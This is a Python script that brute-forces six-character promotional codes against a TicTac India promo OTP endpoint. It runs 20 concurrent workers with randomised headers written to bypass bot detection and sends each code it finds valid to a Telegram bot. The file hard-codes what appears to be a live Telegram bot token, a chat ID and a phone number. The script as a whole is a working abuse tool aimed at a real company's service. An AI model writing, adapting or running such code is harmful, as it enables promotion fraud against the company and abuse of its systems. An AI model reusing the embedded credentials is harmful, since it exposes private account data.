import asyncio
import httpx
import random
import string
import time
import os
from aiohttp import web

# 🔑 ====== CONFIG — UPDATED WITH YOUR CREDENTIALS ======
# It is best practice to keep these in Environment Variables.
# On Render/Heroku: Set these in the "Environment" tab.
# Locally: You can replace os.getenv with the string directly if needed.

PHONE = os.getenv("PHONE", "6486814520")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8405739580:AAF2uGUA6qQQnJbFWfjpWPym0_7cmGNz4iY")
CHAT_ID = os.getenv("CHAT_ID", "5940816248")
PORT = int(os.getenv("PORT", 10000)) 
# =======================================================

URL = "https://www.tictac.com/in/en/xp/jarpecarpromo/home/generateOTP"

def get_headers():
    """Generates dynamic headers to help bypass basic bot detection."""
    return {
        "User-Agent": f"Mozilla/5.0 (Linux; Android 15; Build/AP3A.{random.randint(1000, 9999)}) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.tictac.com",
        "Referer": "https://www.tictac.com/in/en/xp/jarpecarpromo/home/register/",
        "Accept": "application/json, text/javascript, */*; q=0.01",
    }

# Data tracking
stats = {"counter": 0, "valid": 0, "start_time": time.time()}

def gen_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

async def send_to_telegram(ccode: str):
    """Sends the found valid code to your Telegram chat."""
    try:
        async with httpx.AsyncClient(timeout=10) as c:
            response = await c.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHAT_ID, "text": f"✅ Valid TicTac Code Found: {ccode}"}
            )
            if response.status_code == 200:
                stats["valid"] += 1
                print(f"\n🚀 [Success] Code {ccode} sent to Telegram!")
            else:
                print(f"\n❌ Telegram Error: {response.text}")
    except Exception as e:
        print(f"\n⚠️ Connection error to Telegram: {e}")

async def worker(sem: asyncio.Semaphore):
    """Main loop for testing codes."""
    async with httpx.AsyncClient(http2=True, timeout=8.0) as client:
        while True:
            code = gen_code()
            async with sem:
                try:
                    r = await client.post(
                        URL,
                        headers=get_headers(),
                        data={"phone": PHONE, "ccode": code}
                    )
                    stats["counter"] += 1
                    
                    if stats["counter"] % 100 == 0:
                        print(f"📊 Progress: {stats['counter']} attempts | {stats['valid']} valid found")

                    # Check if the response indicates a valid code
                    if r.status_code == 200:
                        res_json = r.json()
                        if res_json.get("status") == "success" or "otp" in res_json:
                            await send_to_telegram(code)
                except Exception:
                    await asyncio.sleep(0.5) # Anti-spam delay on error

# --- Web Server for Render Health Checks ---
async def handle(request):
    uptime = int(time.time() - stats["start_time"])
    return web.Response(text=f"Bot Active\nTotal: {stats['counter']}\nValid: {stats['valid']}\nUptime: {uptime}s")

async def main():
    print(f"📡 Starting worker for Phone: {PHONE}")
    
    # 1. Start internal health check server
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()

    # 2. Start concurrent workers
    sem = asyncio.Semaphore(15) # limits active connections to 15
    tasks = [worker(sem) for _ in range(20)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
        
